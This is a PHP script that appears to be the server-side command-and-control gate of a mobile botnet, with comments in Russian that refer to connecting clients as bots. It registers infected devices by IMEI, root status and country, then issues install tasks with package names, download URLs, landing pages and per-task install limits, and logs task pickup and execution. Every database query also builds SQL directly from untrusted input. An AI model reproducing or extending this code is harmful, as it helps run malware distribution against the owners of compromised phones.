<?php
error_reporting(0);
header('Content-Type: application/json');
include 'func.php';

define('FILE_DEBUG', false);

$json = file_get_contents("php://input");
$obj = json_decode($json, true);

//~ file_put_contents("log.txt", $json."\n", FILE_APPEND);
//~ file_put_contents("log2.txt", print_r($obj, true)."\n", FILE_APPEND);

if(FILE_DEBUG)
{
	$fields = ($_POST)? 'POST' : 'GET';
	foreach($_REQUEST as $k=>$v)
		$fields .= " {$k}: {$v};";
		
	file_put_contents("log.txt", "\n\n\nNEW REQUEST: {$fields}\n", FILE_APPEND);
}

function show_result($text, $tag, $show=true)
{
	$log = " [".$tag."] ". $text;
	//~ $log = date("d.m.y G:i:S") ." [".$tag."] ". $text;
	if(FILE_DEBUG)
		file_put_contents("log.txt", "SQL:{$log}\n", FILE_APPEND);
		
	if($show)
		echo $text;
}

show_result($json, "IN", false);

function xlog($sql)
{
	//~ print("SQL: {$sql}<br />\n");
	return $sql;
}

if(!$obj)
{
	if(FILE_DEBUG)
		file_put_contents("log.txt", "BAD JSON\n", FILE_APPEND);
		die;
}

if ($obj['req'] == 1 && check_country($obj['country'])){
	
	$imei     = $obj['imei'];
	$uniqnum  = $obj['uniqnum'];
	$model    = $obj['model'];
	$root     = $obj['root'];
	$country  = $obj['country'];
	$osver    = $obj['osver'];
	
	include 'db.php';
	$query = "SELECT * FROM `devices` WHERE `uniqnum` = '{$uniqnum}'";	
	$result = $mysqli->query(xlog($query));
	
	if ($result->num_rows > 0){
		
		//обновляем дату коннекта бота
		$query = "UPDATE `devices` SET last_connect = CURRENT_TIMESTAMP WHERE `uniqnum` = '{$uniqnum}'";	
		$mysqli->query(xlog($query));
		
		$response =	array(
			"reg" => 1
		);
		$json_result = json_encode($response);
		echo show_result($json_result, "OUT");
		exit;
	}
	
	else{
	$query = "INSERT INTO `devices` SET `imei`= '{$imei}', `uniqnum`= '{$uniqnum}', `model`= '{$model}', `root`= '{$root}', `country`= '{$country}', `osver`= '{$osver}', last_connect = CURRENT_TIMESTAMP";
	$mysqli->query(xlog($query));
	$req = $mysqli->insert_id;
	if ($req){
		$response =	array(
			"reg" => 1
		);
		$json_result = json_encode($response);
		echo show_result($json_result, "OUT");
		exit;
	}}
}

if ($obj['req'] == 2 ){
	
	$uniqnum  = $obj['uniqnum'];
	
	include 'db.php';
	
	$query = "SELECT * FROM `devices` WHERE `uniqnum` = '{$uniqnum}'";	
	$result = $mysqli->query(xlog($query));
		
	if( $result->num_rows > 0) {
		//обновляем дату коннекта бота
		$query  = "UPDATE `devices` SET last_connect = CURRENT_TIMESTAMP WHERE `uniqnum` = '{$uniqnum}'";	
		$mysqli->query(xlog($query));
		
		
		$query1 = "SELECT `number` FROM `task` WHERE `active` = '1'";
		$result1 = $mysqli->query(xlog($query1));
		$row1 = $result1->fetch_array(MYSQL_ASSOC);
		$task_id = $row1['number'];
		if(!$row1)
		{
			$json_result = json_encode($response);
			echo show_result("no active tasks", "OUT");
			exit;
		}
		
		//тут проверка ставил ли бот уже что либо	 
		$query1 = "SELECT * FROM `tasks_stat` WHERE `task_id` = '{$task_id}' AND `uniqnum` = '{$uniqnum}' AND `run` = '1' ";
		$query2 = "SELECT `device_clear` FROM `task` WHERE `active` = 1";
		
		$result1 = $mysqli->query(xlog($query1));
		$result2 = $mysqli->query(xlog($query2));
		
		$row1 = $result1->num_rows;
		$row2 = $result2->fetch_array(MYSQL_ASSOC);

		if ($row2['device_clear'] == '1' && $row1 != 0){
			echo show_result("device not clear", "OUT");
			exit;
		}
	
		//тут проверка лимита установок.
		$query1 = "SELECT `lim` FROM `task` WHERE `number` = '{$task_id}'";	
		$result1 = $mysqli->query(xlog($query1));
		
		$row1 = $result1->fetch_array(MYSQL_ASSOC);

		$query = "SELECT * FROM `tasks_stat` WHERE `task_id` = '{$task_id}'";
		$result = $mysqli->query(xlog($query));
	
		$taken = $result->num_rows;
		
		//$razn = $taken - $row1['lim'];
		//if ($row1['lim'] <= $taken or $razn == 0 )
		if($row1['lim'] != 0 && $taken > $row1['lim'])
		{
			$query = "UPDATE `task` SET `active` = '2' WHERE `number` = '{$task_id}'";	
			$result = $mysqli->query(xlog($query));
		}
		
		//Тут проверка брал ли уже бот ЭТУ задачу

		$query = "SELECT * FROM `tasks_stat` WHERE `task_id` = '{$task_id}' AND `uniqnum` = '{$uniqnum}'";	
		$result = $mysqli->query(xlog($query));
		$result = $result->num_rows;
		
		//Если в стате уже есть бот с такоим id то не выдает задачу
		if ($result != 0){
			$response =	array(
				"reg" => 1
			);
			$json_result = json_encode($response);
			echo show_result($json_result, "OUT");
			exit;
		}
		
		$query = "SELECT `number`, `package`, `url`, `size`, `times`, `root`, `model`, `osver`, `country`, `landing`, `packy`, `packn` FROM `task` WHERE `active` = 1";	
		$result = $mysqli->query(xlog($query));
		$row = $result->fetch_array(MYSQL_ASSOC);
		
		if(!$row) 
			die("error");
		
		$out = array();
		$out['number'] = $row['number'];
		$out['package'] = $row['package'];
		$out['url'] = $row['url'];
		$out['size'] = $row['size'];
		$out['times'] = $row['times'];
		if(!empty($row['root'])) { $out['root'] = $row['root']; }
		if(!empty($row['model'])) { $out['model'] = $row['model']; }
		if(!empty($row['osver'])) { $out['osver'] = $row['osver']; }
		if(!empty($row['country'])) { $out['country'] = explode("," , $row['country']) ;}
		if(!empty($row['landing'])) { $out['landing'] = $row['landing']; }
		
		
		if( !empty($row['packy']) && !empty($row['packn'])) 
		{ 
			$out['pack'] = array( "packy" => explode("," , $row['packy']), "packn" => explode("," , $row['packn']) );  
		}
		elseif(!empty($row['packy'])) 
		{
			$out['pack'] = array( "packy" => explode("," , $row['packy']) );	
		}
		elseif(!empty($row['packn']))
		{
			$out['pack'] = array( "packn" => explode("," , $row['packn']) );	
		}
	
		
		//~ file_put_contents("log2.txt", print_r(json_encode($row), true), FILE_APPEND);
		$json_result = json_encode($out);
		echo show_result($json_result, "OUT");
		exit;
		
	}else{
		
		$json_result = json_encode("{}");
		echo show_result($json_result, "OUT");
		exit;
	}
	
}

// CONFIRM TASK
if ($obj['req'] == 3  && check_int($obj['number']) ){
	
	$uniqnum  = $obj['uniqnum'];
	$task_id     = $obj['number'];
	
	include 'db.php';
	
	

	$query= "SELECT * FROM `devices` WHERE `uniqnum` = '{$uniqnum}'";	
	$result = $mysqli->query(xlog($query));
	
	$query= "SELECT * FROM `task` WHERE `number` = '{$task_id}'";	
	$result2 = $mysqli->query(xlog($query));
	
	
	
	if( $result && $result2) {
		
		//обновляем дату коннекта бота
		$query = "UPDATE `devices` SET last_connect = CURRENT_TIMESTAMP WHERE `uniqnum` = '{$uniqnum}'";	
		$mysqli->query(xlog($query));
		
		
		$query = "INSERT INTO `tasks_stat` SET `uniqnum`= '{$uniqnum}', `task_id`= '{$task_id}', `take`= '1'";
		$req = $mysqli->query(xlog($query));
		
		if ($req){
			$response =	array(
				"reg" => 1
			);
			$json_result = json_encode($response);
			echo show_result($json_result, "OUT");
			exit;
		}
	
	}
	

}

if ($obj['req'] == 4 && check_int($obj['number']) ){
	

	$task_id = $obj['number'];
	$uniqnum = $obj['uniqnum'];
	
	include 'db.php';
	
	$query= "SELECT * FROM `devices` WHERE `uniqnum` = '{$uniqnum}'";	
	$result = $mysqli->query(xlog($query));
	
	$query= "SELECT * FROM `task` WHERE `number` = '{$task_id}'";	
	$result2 = $mysqli->query(xlog($query));
	
	$query= "SELECT * FROM `statistics` WHERE `task_id` = '{$task_id}'";	
	$result3 = $mysqli->query(xlog($query));
	
	if( $result && $result2 && $result3) {
		
		//обновляем дату коннекта бота
		$query = "UPDATE `devices` SET last_connect = CURRENT_TIMESTAMP WHERE `uniqnum` = '{$uniqnum}'";	
		$mysqli->query(xlog($query));
		
		$query = "UPDATE `tasks_stat` SET `run`= '1'  WHERE `uniqnum` = '{$uniqnum}' AND `task_id` = '{$task_id}'";
		$req = $mysqli->query(xlog($query));
		
		
		$query = "UPDATE `statistics` SET `run` = `run` + 1 WHERE `task_id` = '{$task_id}'";
		$req = $mysqli->query(xlog($query));
		
		if ($req){
			$response =	array(
				"reg" => 1
			);
			$json_result = json_encode($response);
			echo show_result($json_result, "OUT");
			exit;
		}
	
	}
	

}

?>

